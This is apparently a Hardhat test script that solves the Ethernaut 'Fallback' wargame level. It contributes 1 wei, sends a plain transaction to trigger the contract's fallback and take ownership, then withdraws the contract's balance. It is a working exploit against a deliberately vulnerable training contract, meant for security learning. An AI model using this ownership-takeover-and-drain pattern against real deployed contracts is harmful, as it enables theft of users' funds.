import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x9CB391dbcD447E645D6Cb55dE6ca23164130D008";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;

describe("Fallback", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const contractFactory = await ethers.getContractFactory("Fallback");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await contractFactory.attach(challengeAddr);
    });

    it("Should solve the challenge", async function () {

        const initialOwner = await contract.owner();
        
        expect(initialOwner).to.not.equal(owner.address);
        expect(await submitInstance(contract.address)).to.be.false;

        // // call contribute to add attacker address to contributions mapping
        txn = await contract.contribute({
            value: ethers.utils.parseUnits("1", "wei"),
        });
        await txn.wait();

        // submit the fallback function as attacker
        const fallbackTxn: any = {
            to: contract.address,
            value: ethers.utils.parseUnits("1", "wei"),
        };
        txn = await owner.sendTransaction(fallbackTxn);
        await txn.wait();

        // drain the contract
        txn = await contract.withdraw();
        await txn.wait();

        expect(initialOwner).to.not.equal(await contract.owner());
        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});